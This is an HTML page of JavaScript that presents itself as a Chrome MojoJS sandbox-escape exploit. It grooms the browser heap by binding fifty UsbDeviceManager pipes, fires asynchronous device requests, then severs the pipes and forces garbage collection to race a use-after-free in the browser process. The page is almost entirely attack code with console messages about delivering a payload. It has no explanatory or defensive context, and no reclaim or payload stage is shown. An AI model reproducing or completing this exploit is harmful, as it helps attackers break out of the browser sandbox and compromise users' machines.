<!DOCTYPE html>
<html>
<head>
    <title>MojoJS Sandbox Escape</title>
    <script src="gen/mojo/public/js/bindings.js"></script>
</head>
<body>
    <h1>Hunting the Browser Process</h1>
    <script type="module">
        import { UsbDeviceManagerRemote, UsbDeviceManager } from './gen/services/device/public/mojom/usb_manager.mojom.m.js';

        async function triggerExploit() {
            if (typeof Mojo === 'undefined') {
                console.error("[-] MojoJS not found. Ensure --enable-blink-features=MojoJS is set.");
                return;
            }

            console.log("[*] Grooming the Browser Heap...");
            let managers = [];
            
            for(let i = 0; i < 50; i++) {
                // 1. Create a raw Mojo message pipe. This gives us two endpoints.
                let pipe = Mojo.createMessagePipe();
                
                // 2. Bind the Browser Process end of the pipe (handle0)
                Mojo.bindInterface(UsbDeviceManager.$interfaceName, pipe.handle0);

                // 3. Bind our JS Remote to the other end of the pipe (handle1)
                let usbManagerRemote = new UsbDeviceManagerRemote();
                usbManagerRemote.$.bindHandle(pipe.handle1);
                
                managers.push(usbManagerRemote);
            }

            console.log("[+] Bound 50 Mojo pipes to Browser Process.");
            console.log("[*] Triggering async hardware requests...");
            
            for(let m of managers) {
                // Call GetDevices to initiate the async hardware scan
                m.getDevices().catch(e => {}); 
            }

            // THE RACE CONDITION
            await new Promise(r => setTimeout(r, 1)); 

            console.log("[!] TRIGGERING FREE: Severing pipes...");
            
            // The Kill: Close the pipes to trigger the C++ destructor
            for(let m of managers) {
                m.$.close();
            }

            // Force garbage collection in V8
            if (window.gc) { window.gc(); }

            console.log("[?] Payload delivered. Waiting for C++ callback...");
        }

        triggerExploit();
    </script>
</body>
</html>
